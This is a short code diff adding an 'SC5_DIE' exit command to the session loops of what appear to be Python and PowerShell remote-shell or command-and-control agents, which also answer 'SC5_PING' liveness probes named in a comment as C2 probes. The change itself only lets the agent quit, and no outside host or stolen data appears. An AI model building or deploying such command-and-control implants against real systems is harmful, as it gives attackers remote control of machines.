@@ -103,6 +103,8 @@ def _run_session(s):
             if not cmd:
                 continue
             # Built-in ping for C2 liveness probes
+            if cmd == "SC5_DIE":
+                os._exit(0)
             if cmd.startswith("SC5_PING "):
                 token = cmd.split(" ", 1)[1].strip()
                 try:
@@ -221,6 +223,7 @@ while ($true) {{
         if ($null -eq $cmd) {{ break }}
         $cmd = $cmd.Trim()
         if ($cmd -eq '') {{ continue }}
+        if ($cmd -eq 'SC5_DIE') {{ exit 0 }}
         if ($cmd.StartsWith('SC5_PING ')) {{
           $tok = $cmd.Substring(9).Trim()
           $w.WriteLine('SC5_PONG ' + $tok)
